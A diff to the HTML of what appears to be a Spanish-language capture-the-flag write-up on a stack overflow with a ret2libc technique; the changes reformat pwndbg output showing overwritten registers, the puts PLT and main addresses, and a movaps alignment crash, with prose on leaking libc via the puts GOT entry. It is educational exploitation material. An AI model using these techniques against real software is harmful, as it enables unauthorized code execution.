@@ -427,7 +427,7 @@ access denied.
 Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x0000000000401618 </span><span class="p">in</span><span class="am"> auth</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
-$1 = 0x4242424242424242
+</span><span class="az">$1</span><span class="p"> = 0x4242424242424242
 </span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
 </span><span class="az">0x7fffffffe2d8</span><span class="p">:    0x4343434343434343
 </span><span class="ro">pwndbg></span>
@@ -435,29 +435,9 @@ $1 = 0x4242424242424242
 
 <p class="plain-text">Para lekear una direccion de <code class="language-plaintext highlighter-rouge">libc</code> base necesitaremos algunas cosas, primero la direcion de la funcion <code class="language-plaintext highlighter-rouge">puts@plt</code> del propio binario que podemos ver desde gdb</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">plt
-</span><span class="sa">Section .plt 0x401020-0x401170:  </span><span class="p">
-0x401030: putchar@plt
-0x401040: strcpy@plt
-0x401050: puts@plt
-0x401060: fclose@plt
-0x401070: getpwuid@plt
-0x401080: getuid@plt
-0x401090: printf@plt
-0x4010a0: rewind@plt
-0x4010b0: fgetc@plt
-0x4010c0: read@plt
-0x4010d0: fgets@plt
-0x4010e0: strcmp@plt
-0x4010f0: getchar@plt
-0x401100: gets@plt
-0x401110: syslog@plt
-0x401120: access@plt
-0x401130: fopen@plt
-0x401140: __isoc99_scanf@plt
-0x401150: strcat@plt
-0x401160: exit@plt
-</span><span class="ro">pwndbg></span>
+<code><span class="ro">pwndbg></span><span class="p"> p puts
+</span><span class="az">$1 </span><span class="p">= {&lttext variable, no debug info>}</span><span class="az"> 0x401050 </span><span class="p">&lt</span><span class="am">puts@plt</span><span class="p">>  
+</span><span class="ro">pwndbg> </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ademas usaremos la dirección de <code class="language-plaintext highlighter-rouge">got</code> puts que hara referencia a la direccion de puts cargandola desde <code class="language-plaintext highlighter-rouge">libc</code>, la idea es lekear esta direccion para calcular libc</p>
@@ -486,7 +466,7 @@ GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | F
 <p class="plain-text">Por ultimo la direccion de <code class="language-plaintext highlighter-rouge">main</code> para que despues de lekear libc con nuestro primer payload vuelva al inicio y podamos enviar un nuevo payload sin dejar de ejecutarlo</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">p main
-$1 = {&lttext variable, no debug info>} </span><span class="az">0x401619 </span><span class="p">&lt</span><span class="am">main</span><span class="p">>  
+</span><span class="az">$1</span><span class="p"> = {&lttext variable, no debug info>} </span><span class="az">0x401619 </span><span class="p">&lt</span><span class="am">main</span><span class="p">>  
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
@@ -647,24 +627,10 @@ shell.interactive()</span>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x00007f9674c4f2f6 </span><span class="p">in </span><span class="am">??</span><span class="p"> () from </span><span class="ve">./libc.so.6
-</span><span class="ro">pwndbg> </span><span class="p">context disasm
-LEGEND: </span><span class="am">STACK</span><span class="p"> | </span><span class="az">HEAP</span><span class="p"> | </span><span class="ro">CODE</span><span class="p"> | </span><span class="sa">DATA</span><span class="p"> | RWX | RODATA
-</span><span class="az">───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────
-</span><span class="ve"> ► 0x7f9674c4f2f6    </span><span class="na">movaps </span><span class="no">xmmword ptr </span><span class="p">[</span><span class="no">rsp </span><span class="p">+ </span><span class="mi">0x40</span><span class="p">], </span><span class="no">xmm0</span><span class="p">
-   0x7f9674c4f2fb    </span><span class="na">call   </span><span class="mi">sigaction</span><span class="p">                &lt</span><span class="ro">sigaction</span><span class="p">>
- 
-   0x7f9674c4f300    </span><span class="na">lea    </span><span class="no">rsi</span><span class="p">, [</span><span class="no">rip </span><span class="p">+ </span><span class="mi">0x39e2f9</span><span class="p">]
-   0x7f9674c4f307    </span><span class="na">xor    </span><span class="no">edx</span><span class="p">, </span><span class="no">edx</span><span class="p">
-   0x7f9674c4f309    </span><span class="na">mov    </span><span class="no">edi</span><span class="p">, </span><span class="mi">3</span><span class="p">
-   0x7f9674c4f30e    </span><span class="na">call   </span><span class="mi">sigaction</span><span class="p">                &lt</span><span class="ro">sigaction</span><span class="p">>
- 
-   0x7f9674c4f313    </span><span class="na">xor    </span><span class="no">edx</span><span class="p">, </span><span class="no">edx</span><span class="p">
-   0x7f9674c4f315    </span><span class="na">mov    </span><span class="no">rsi</span><span class="p">, </span><span class="no">rbp</span><span class="p">
-   0x7f9674c4f318    </span><span class="na">mov    </span><span class="no">edi</span><span class="p">, </span><span class="mi">2</span><span class="p">
-   0x7f9674c4f31d    </span><span class="na">call   </span><span class="mi">sigprocmask</span><span class="p">                &lt</span><span class="ro">sigprocmask</span><span class="p">>
-</span><span class="az">──────────────────────────────────────────────────────────────────────────────────  
-</span><span class="ro">pwndbg> </span><span class="p">regs rsp
- RSP  </span><span class="am">0x7fff39bee1f8</span><span class="p"> —▸ 0x402181 ◂— 'access denied.'
+</span><span class="ro">pwndbg> </span><span class="p">x/i $rip
+=></span><span class="az"> 0x7eedc9050973</span><span class="p">:    </span><span class="ve">movaps</span><span class="p"> XMMWORD PTR [</span><span class="ro">rsp</span><span class="p">+</span><span class="az">0x40</span><span class="p">],</span><span class="ro">xmm0  
+pwndbg></span><span class="p"> p/x $rsp
+</span><span class="az">$1</span><span class="p"> = 0x7fff39bee1f8
 </span><span class="ro">pwndbg> </code>
 </code></pre></div></div><br>
 
